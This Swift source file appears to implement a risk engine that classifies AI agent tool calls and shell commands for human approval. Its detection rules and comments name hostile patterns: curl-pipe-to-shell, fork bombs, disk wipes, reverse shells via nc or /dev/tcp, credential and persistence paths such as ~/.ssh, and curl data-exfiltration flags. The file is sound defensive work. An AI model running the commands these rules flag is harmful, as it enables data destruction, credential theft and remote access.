import Foundation

/// A risk verdict with a human reason, replacing naive keyword matching.
public struct RiskAssessment: Sendable, Equatable {
    public let level: RiskLevel
    public let reason: String          // short human explanation, e.g. "recursive delete"
    public let alwaysDangerous: Bool   // passive-guardian: prompt even when auto-allowing
}

/// Parses what a tool actually wants to do and assigns risk + a reason.
///
/// Far more accurate than keyword matching: `rm file.txt` is amber, `rm -rf ~`
/// is red; `git push` to a branch is amber, `--force` to `main` is red; `curl
/// localhost` is calm, `curl … | sh` is red. `alwaysDangerous` marks the things
/// passive-guardian mode should *always* surface even while auto-allowing.
public enum RiskEngine {

    public static func assess(toolName: String?, event: HookEvent? = nil,
                              command: String? = nil, filePath: String? = nil,
                              cwd: String? = nil) -> RiskAssessment {
        let name = (toolName ?? "").lowercased()
        // Keep the full action after the server prefix (mcp__server__delete_file →
        // "delete_file"), not just the last underscore segment ("file"), so the
        // verb that drives risk classification isn't dropped.
        let bare = name.hasPrefix("mcp__") ? name.components(separatedBy: "__").dropFirst(2).joined(separator: "_") : name

        if name == "bash" || bare.contains("bash") || bare.contains("shell") {
            return assessCommand(command ?? event?.command ?? "")
        }
        // Severity order matters: a DESTRUCTIVE verb wins over a co-occurring PATH or read/write
        // verb — so a tool like `mcp__fs__delete_file` carrying {"path":…} is NOT downgraded to
        // .read by the filePath branch below and silently auto-allowed. This MUST precede the
        // filePath branch. (Mirrors ToolRisk.classify's destructive-before-read ordering.)
        if bare.contains("delete") || bare.contains("remove") || bare.contains("destroy") || bare.contains("drop")
            || bare.contains("deploy") || bare.contains("publish") || bare.contains("kill") {
            return RiskAssessment(level: .danger, reason: "destructive action", alwaysDangerous: true)
        }
        if let path = filePath ?? event?.filePath {
            return assessFile(tool: bare, path: path, cwd: cwd ?? event?.cwd)
        }
        if bare.contains("fetch") || bare.contains("web") || bare.contains("http") {
            return RiskAssessment(level: .danger, reason: "network access", alwaysDangerous: false)
        }
        if bare.contains("write") || bare.contains("edit") || bare.contains("create") || bare.contains("update") {
            return RiskAssessment(level: .write, reason: "modifies a file", alwaysDangerous: false)
        }
        if bare.contains("read") || bare.contains("grep") || bare.contains("glob") || bare.contains("ls") || bare.contains("list") || bare.contains("search") {
            return RiskAssessment(level: .read, reason: "read-only", alwaysDangerous: false)
        }
        return RiskAssessment(level: .unknown, reason: "needs approval", alwaysDangerous: false)
    }

    // MARK: - Bash command parsing

    /// Transparent prefixes we step THROUGH to find the real command, so a
    /// dangerous command can't hide behind `time`/`env`/`sudo`/etc. or an
    /// env-assignment. (sudo/doas are stepped through AND flagged.)
    private static let wrappers: Set<String> = [
        "time", "nohup", "env", "xargs", "command", "exec", "builtin",
        "nice", "ionice", "stdbuf", "setsid", "timeout", "sudo", "doas",
    ]

    /// The command-position tokens of each `;`/`&`/`|`/newline/subshell segment:
    /// every wrapper it passes through PLUS the first real command. Env-var
    /// assignments (FOO=bar) are skipped. Lets us detect `time rm`, `FOO=1 rm`,
    /// `  rm`, `(rm …)`, `sudo rm` — all the anchored-regex bypasses.
    private static func commandLeaders(_ cmd: String) -> Set<String> {
        var result: Set<String> = []
        for seg in cmd.split(whereSeparator: { ";&|\n`()".contains($0) }) {
            var passedWrapper = false
            for tok in seg.split(whereSeparator: { $0 == " " || $0 == "\t" }).map(String.init) {
                if tok.range(of: #"^\w+=.*"#, options: .regularExpression) != nil { continue }  // env assignment
                if wrappers.contains(tok) { result.insert(tok); passedWrapper = true; continue }
                // A wrapper's OWN args (a flag, a numeric duration like `timeout 5`, a flag=val)
                // must be skipped so the real command after them is still detected — e.g.
                // `timeout 5 rm -rf ~` or `nice -n 10 rm …` would otherwise stop at "5"/"-n".
                if passedWrapper, tok.hasPrefix("-") || tok.range(of: #"^\d+$"#, options: .regularExpression) != nil { continue }
                result.insert(tok)
                break   // reached the real command
            }
        }
        return result
    }

    /// First quoted payload (for `bash -c "…"` → assess the inner command).
    /// First quoted payload BY POSITION (not by quote-char precedence) — so a decoy
    /// double-quoted token AFTER a single-quoted `-c` payload can't mask it.
    private static func quotedPayload(_ raw: String) -> String? {
        let opens: [(Character, String.Index)] = ["\"", "'"].compactMap { (q: Character) in
            raw.firstIndex(of: q).map { (q, $0) }
        }
        guard let (q, s) = opens.min(by: { $0.1 < $1.1 }),
              let e = raw[raw.index(after: s)...].firstIndex(of: q) else { return nil }
        return String(raw[raw.index(after: s)..<e])
    }

    /// EVERY quoted span in a string (defense-in-depth: assess them all, take the most
    /// severe, so no ordering trick can hide the real `-c` payload behind a decoy).
    private static func quotedPayloads(_ raw: String) -> [String] {
        var out: [String] = []
        var i = raw.startIndex
        while i < raw.endIndex {
            let c = raw[i]
            if c == "\"" || c == "'", let e = raw[raw.index(after: i)...].firstIndex(of: c) {
                out.append(String(raw[raw.index(after: i)..<e]))
                i = raw.index(after: e)
            } else { i = raw.index(after: i) }
        }
        return out
    }

    /// Split into top-level statements (`;`, `&&`, `||`, `&`, newline) and return the
    /// MOST SEVERE — pipelines (`a | b`) stay intact so "curl … | sh" is one statement.
    /// Prevents a benign segment ("curl localhost") from downgrading a dangerous one
    /// ("curl evil.com") in the same line, and stops substring checks from spanning
    /// unrelated statements (audit #3/#16).
    private static func assessCommand(_ raw: String, depth: Int = 0) -> RiskAssessment {
        let statements = splitStatements(raw)
        guard statements.count > 1 else { return assessStatement(raw, depth: depth) }
        return statements
            .map { assessStatement($0, depth: depth) }
            .max { a, b in a.level.rank != b.level.rank ? a.level.rank < b.level.rank
                                                        : (!a.alwaysDangerous && b.alwaysDangerous) }
            ?? assessStatement(raw, depth: depth)
    }

    private static func splitStatements(_ raw: String) -> [String] {
        var out: [String] = [], cur = ""
        let chars = Array(raw); var i = 0
        while i < chars.count {
            let c = chars[i]
            if c == ";" || c == "\n" { out.append(cur); cur = ""; i += 1; continue }
            if (c == "&" || c == "|"), i + 1 < chars.count, chars[i + 1] == c {  // && or ||
                out.append(cur); cur = ""; i += 2; continue
            }
            if c == "&" { out.append(cur); cur = ""; i += 1; continue }          // background; keep single | (pipeline)
            cur.append(c); i += 1
        }
        out.append(cur)
        return out.map { $0.trimmingCharacters(in: .whitespaces) }.filter { !$0.isEmpty }
    }

    /// The git SUBCOMMAND of a statement, skipping git's global options (`-C <path>`, `-c k=v`,
    /// `--git-dir …`, `--paginate`, …) so `git -C /r push --force` and `git -c k=v reset --hard`
    /// are still recognized. Contiguous-substring matching (`cmd.contains("git push")`) missed
    /// these and let a force-push / hard-reset fall through to "safe". nil if not a git command.
    private static func gitSubcommand(_ cmd: String) -> String? {
        let toks = cmd.split(whereSeparator: { $0 == " " || $0 == "\t" }).map(String.init)
        guard let gi = toks.firstIndex(of: "git") else { return nil }
        let valueOpts: Set<String> = ["-c", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"]
        var i = gi + 1
        while i < toks.count {
            let t = toks[i]
            if t == "-C" || valueOpts.contains(t) { i += 2; continue }   // option + its separate value token
            if t.hasPrefix("-") { i += 1; continue }                     // attached-value (--x=y) or bare flag
            return t                                                     // first non-option token = the subcommand
        }
        return nil
    }

    private static func assessStatement(_ raw: String, depth: Int = 0) -> RiskAssessment {
        let cmd = raw.lowercased()
        let leaders = commandLeaders(cmd)

        // Pipe-to-shell/interpreter — the classic remote-exec footgun. ANY pipe into a shell OR a
        // scripting interpreter that runs stdin executes arbitrary fetched/decoded/generated code
        // (curl|sh, base64 -d|sh, curl x.py|python, …|node|ruby|perl|php), so flag the pipe itself.
        if cmd.range(of: #"\|\s*(sh|bash|zsh|dash|ksh|python3?|node|ruby|perl|php)\b"#, options: .regularExpression) != nil {
            return red("pipes into a shell/interpreter", always: true)
        }
        // Fork bomb / disk wipe.
        if cmd.contains(":(){") { return red("fork bomb", always: true) }
        if cmd.contains("mkfs") || cmd.range(of: #"\bdd\b.*of="#, options: .regularExpression) != nil {
            return red("writes raw disk", always: true)
        }
        // Privilege escalation (wrapper-aware).
        if !leaders.isDisjoint(with: ["sudo", "doas"]) {
            return red("runs as root (sudo)", always: true)
        }
        // Inline code execution — can do anything, so always surface.
        if !leaders.isDisjoint(with: ["python", "python3", "node", "ruby", "perl", "osascript", "php"]),
           cmd.range(of: #"\s-(c|e)\b"#, options: .regularExpression) != nil {
            return red("runs an inline script", always: true)
        }
        if leaders.contains("eval") { return red("evaluates a dynamic command", always: true) }
        if !leaders.isDisjoint(with: ["nc", "ncat", "socat"]),
           cmd.range(of: #"\s-e\b"#, options: .regularExpression) != nil || cmd.contains(" exec") {
            return red("opens a reverse shell", always: true)
        }
        if leaders.contains("crontab") { return red("edits scheduled jobs", always: true) }
        if leaders.contains("launchctl"), cmd.range(of: #"\b(load|bootstrap|enable|submit)\b"#, options: .regularExpression) != nil {
            return red("loads a launch agent", always: true)
        }
        // Shell -c "<payload>": assess the wrapped command itself. Assess EVERY quoted span
        // (not just the first) and take the MOST severe, so a decoy quote can't mask the real
        // payload (e.g. `bash -c 'rm -rf ~' "ok"` must not be judged by "ok").
        if depth < 3, !leaders.isDisjoint(with: ["bash", "sh", "zsh", "dash", "ksh"]),
           cmd.range(of: #"\s-c\b"#, options: .regularExpression) != nil {
            let spans = quotedPayloads(raw)
            if !spans.isEmpty {
                let assessed = spans.map { assessCommand($0, depth: depth + 1) }
                return assessed.max { a, b in a.level.rank != b.level.rank ? a.level.rank < b.level.rank
                                                                           : (!a.alwaysDangerous && b.alwaysDangerous) }
                    ?? assessed[0]
            }
        }
        // rm — depends on recursion + target breadth.
        if leaders.contains("rm") {
            let recursive = cmd.range(of: #"\brm\b[^;&|]*\s-\w*[rf]"#, options: .regularExpression) != nil
            let broadTarget = cmd.contains(" / ") || cmd.hasSuffix(" /") || cmd.contains(" ~") || cmd.contains("/*") || cmd.contains("$home") || cmd.contains("${home")
            if recursive && broadTarget { return red("recursive delete of a broad path", always: true) }
            if recursive { return red("recursive delete", always: true) }
            return amber("deletes a file")
        }
        // git push — force to a protected branch is the scary one. (subcommand-aware so a global
        // option like `git -C /r push --force` can't slip past a contiguous-substring check.)
        let gitSub = gitSubcommand(cmd)
        if gitSub == "push" {
            // Force = --force / --force-with-lease / -f / a `+refspec` (anchored to a token
            // start, so a stray '+' elsewhere — e.g. "c++-rewrite" — isn't a false positive).
            let force = cmd.contains("--force") || cmd.contains("--force-with-lease")
                || cmd.range(of: #"\s-f(\s|$)"#, options: .regularExpression) != nil
                || cmd.range(of: #"(^|\s)\+[\w./-]+"#, options: .regularExpression) != nil
            // Protected = a WHOLE ref token equal to a protected branch (so "prod-spike" or
            // "maintenance" don't match), checking the destination of a src:dst refspec too.
            let protectedRefs: Set<String> = ["main", "master", "prod", "production", "release"]
            let refTokens = cmd.split(whereSeparator: { " \t".contains($0) })
                .map(String.init).filter { !$0.hasPrefix("-") && $0 != "git" && $0 != "push" }
                .flatMap { tok -> [String] in
                    let t = tok.hasPrefix("+") ? String(tok.dropFirst()) : tok
                    let parts = t.split(separator: ":").map(String.init)
                    return parts.map { ($0 as NSString).lastPathComponent }   // refs/heads/main → main
                }
            let protected = refTokens.contains { protectedRefs.contains($0) }
            if force && protected { return red("force-push to a protected branch", always: true) }
            if force { return red("force-push") }
            return amber("pushes to a remote")
        }
        if (gitSub == "reset" && cmd.contains("--hard")) || gitSub == "clean" { return red("discards uncommitted work") }
        // System paths.
        if cmd.range(of: #">\s*/(etc|usr|bin|sbin|system|library)"#, options: .regularExpression) != nil
            || cmd.range(of: #"\b(chmod|chown)\b.*\s/(etc|usr|bin|sbin|system)"#, options: .regularExpression) != nil {
            return red("touches a system path")
        }
        // Reverse shell via bash's network pseudo-device (e.g. `bash -i >& /dev/tcp/host/port`).
        if cmd.contains("/dev/tcp/") || cmd.contains("/dev/udp/") {
            return red("opens a network socket (reverse shell)", always: true)
        }
        // World-writable / setuid permission change (777, a+w, o+w, +s) — privilege/persistence risk.
        if cmd.contains("chmod"), cmd.range(of: #"(777|\+s|a\+w|o\+w)"#, options: .regularExpression) != nil {
            return red("makes a file world-writable / setuid", always: true)
        }
        // Credential / persistence files (read OR write, via any utility or redirect) — checked
        // BEFORE the amber redirect/move rules so `echo x >> ~/.bashrc` isn't downgraded to .write
        // and auto-allowed in Autonomous. assessFile only guards the first-party File tools, so a
        // raw Bash `cat ~/.ssh/id_rsa` would otherwise fall through to .read. cmd is lowercased.
        if Self.touchesSensitivePath(cmd) {
            return red("touches a credential/persistence file", always: true)
        }
        // Process control / shutdown.
        if cmd.contains("killall") || cmd.contains("pkill") || cmd.range(of: #"(^|\s)kill\s+-9"#, options: .regularExpression) != nil {
            return red("kills processes")
        }
        if cmd.contains("shutdown") || cmd.contains("reboot") { return red("shuts down / reboots", always: true) }
        // Publishing / deploys.
        if cmd.contains("npm publish") || cmd.contains("pod trunk push") || cmd.contains("gh release create") {
            return red("publishes a release", always: true)
        }
        // Network egress (non-piped). Only treat as a calm "local request" when a
        // loopback host is the actual TARGET (host position) AND there's no external
        // http(s) URL — so "localhost" buried in a path/query of an external URL can't
        // downgrade a real egress.
        if cmd.contains("curl ") || cmd.contains("wget ") {
            let loopbackHost = cmd.range(of: #"(://|@|\s|=)(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])(:\d+)?([/\s"']|$)"#, options: .regularExpression) != nil
            let externalURL = cmd.range(of: #"https?://(?!localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])"#, options: .regularExpression) != nil
            // Shipping a LOCAL FILE / body (-d @file, --data*@file, --upload-file, --form,
            // POST/PUT) is exfiltration even to a loopback target (the local service can forward
            // it), so it can't take the calm "local request" downgrade. cmd is already
            // lowercased, so match long flags + the @file marker (case-safe — curl's -F/-T/-d
            // collide with -f/-t case-folded).
            let sendsData = cmd.range(of: #"(--data\b|--data-[a-z]+\b|--upload-file\b|--form\b|--post-file\b|--post-data\b|--request\s+(post|put)|\s-d\s*@|=@)"#, options: .regularExpression) != nil
            if loopbackHost && !externalURL && !sendsData {
                return RiskAssessment(level: .read, reason: "local request", alwaysDangerous: false)
            }
            return amber("network request")
        }
        // Package installs — worth a glance, not always-dangerous.
        if cmd.range(of: #"\b(npm|pnpm|yarn|brew|pip|pip3|gem|cargo)\b.*(install|add|uninstall)"#, options: .regularExpression) != nil {
            return amber("installs/removes packages")
        }
        // Mutating git / file moves.
        if ["commit", "merge", "rebase"].contains(gitSub ?? "") || cmd.contains("mv ") || cmd.contains("> ") {
            return amber("modifies files / history")
        }
        return RiskAssessment(level: .read, reason: "safe command", alwaysDangerous: false)
    }

    // MARK: - File tool parsing

    private static func assessFile(tool: String, path: String, cwd: String?) -> RiskAssessment {
        let p = (path as NSString).expandingTildeInPath
        let lower = p.lowercased()
        let inSystem = lower.hasPrefix("/etc") || lower.hasPrefix("/usr") || lower.hasPrefix("/system") || lower.hasPrefix("/library") || lower.hasPrefix("/private/etc")
        let inWorkspace = cwd.map { p.hasPrefix(($0 as NSString).expandingTildeInPath) } ?? false
        let writing = tool.contains("write") || tool.contains("edit") || tool.contains("create")
            || tool.contains("move") || tool.contains("rename")   // move/rename mutate the filesystem

        // The irreversible 1% at the USER level: login/boot persistence, credentials, shell
        // init, and EdgePanel's own allowlist file. These expand to ~/Library/... or ~/.x and
        // do NOT match the root-anchored /library /etc checks above, so without this they'd be
        // a plain .write that Autonomous mode silently auto-allows. Writing them = persistence,
        // credential theft, or self-modifying the permission allowlist → always require a tap.
        let home = NSHomeDirectory().lowercased()
        // Boundary-aware: match the exact file (~/.zshrc), or dir contents / extensions
        // (~/.ssh/id_rsa, ~/.claude/settings.json) — but NOT a sibling like ~/.zshrc_backup
        // or ~/.ssh_notes which a bare hasPrefix would wrongly flag.
        func underHome(_ rel: String) -> Bool {
            let full = home + rel
            guard lower.hasPrefix(full) else { return false }
            if lower.count == full.count { return true }
            let next = lower[lower.index(lower.startIndex, offsetBy: full.count)]
            return next == "/" || next == "."
        }
        let sensitiveUser = underHome("/.ssh") || underHome("/.aws") || underHome("/.gnupg")
            || underHome("/library/launchagents") || underHome("/library/launchdaemons")
            || underHome("/.claude/settings") || underHome("/.zshrc") || underHome("/.zprofile") || underHome("/.zshenv")
            || underHome("/.bashrc") || underHome("/.bash_profile") || underHome("/.profile")
            || lower.hasPrefix("/private/var/at/tabs")

        if inSystem || sensitiveUser {
            // sensitiveUser is alwaysDangerous for BOTH read and write — READING ~/.ssh/id_rsa
            // or a credential file is exfiltration and must surface a tap even in Autonomous;
            // a system-file READ stays a (surfaced) danger but not always-dangerous.
            let reason = sensitiveUser ? (writing ? "writes a credential/persistence file" : "reads a credential/persistence file")
                                       : (writing ? "writes a system file" : "reads a system file")
            return RiskAssessment(level: .danger, reason: reason, alwaysDangerous: sensitiveUser || writing)
        }
        if writing {
            return RiskAssessment(level: .write, reason: inWorkspace ? "edits a project file" : "writes outside the workspace", alwaysDangerous: false)
        }
        return RiskAssessment(level: .read, reason: inWorkspace ? "reads a project file" : "reads outside the workspace", alwaysDangerous: false)
    }

    /// Does a (lowercased) shell command reference a credential / persistence file? Matches
    /// the same set assessFile guards — tilde, $HOME, and absolute-home forms — boundary-aware
    /// so a sibling like ~/.ssh_notes isn't flagged.
    private static func touchesSensitivePath(_ cmd: String) -> Bool {
        let home = NSHomeDirectory().lowercased()
        let rels = ["/.ssh", "/.aws", "/.gnupg", "/.claude/settings", "/.zshrc", "/.zprofile",
                    "/.zshenv", "/.bashrc", "/.bash_profile", "/.profile",
                    "/library/launchagents", "/library/launchdaemons"]
        func hit(_ rel: String) -> Bool {
            for base in ["~" + rel, "$home" + rel, "${home}" + rel, home + rel] {
                guard let r = cmd.range(of: base) else { continue }
                let after = cmd[r.upperBound...].first
                if after == nil || after == "/" || after == "." || after == " " || after == "\"" || after == "'" { return true }
            }
            return false
        }
        if rels.contains(where: hit) { return true }
        return cmd.range(of: #"(^|\s|=|"|')/(etc|private/etc|private/var/at/tabs)\b"#, options: .regularExpression) != nil
    }

    private static func red(_ reason: String, always: Bool = false) -> RiskAssessment {
        RiskAssessment(level: .danger, reason: reason, alwaysDangerous: always)
    }
    private static func amber(_ reason: String) -> RiskAssessment {
        RiskAssessment(level: .write, reason: reason, alwaysDangerous: false)
    }
}
